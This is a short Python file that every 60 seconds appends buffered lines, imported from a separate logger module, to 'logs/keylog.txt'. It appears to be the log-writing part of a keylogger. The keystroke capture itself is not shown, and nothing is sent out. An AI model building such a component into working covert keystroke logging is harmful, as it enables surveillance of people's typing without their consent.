import threading
from logger import log_buffer
from datetime import datetime

def write_log():
    if log_buffer:
        with open("logs/keylog.txt", "a") as file:
            for line in log_buffer:
                file.write(line + "\n")
            log_buffer.clear()
    threading.Timer(60, write_log).start()

def schedule_log_writer():
    write_log()
